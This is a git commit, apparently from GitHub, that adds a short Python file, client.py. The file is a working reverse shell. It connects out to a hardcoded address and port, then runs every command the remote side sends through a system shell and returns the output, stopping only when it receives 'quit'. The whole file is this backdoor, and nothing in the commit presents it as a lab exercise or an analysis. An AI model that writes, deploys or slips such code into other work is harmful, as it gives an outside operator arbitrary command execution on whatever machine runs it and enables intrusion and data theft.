aa5c2d7727750d5972ac7faba1d9618852ff4c81
jacktomyzb <42542415+jacktomyzb@users.noreply.github.com>
2018-11-03 00:19:51 +0800

    Add files via upload

---
+++ client.py
@@ -0,0 +1,14 @@
+import socket,subprocess
+HOST="192.168.43.227"
+PORT=11443
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((HOST,PORT))
+s.send("ok")
+
+while 1:
+    data=s.recv(1024)
+    if data=="quit":break
+    proc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+    stdout_value=proc.stdout.read()+proc.stderr.read()
+    s.send(stdout_value)
+s.close()    
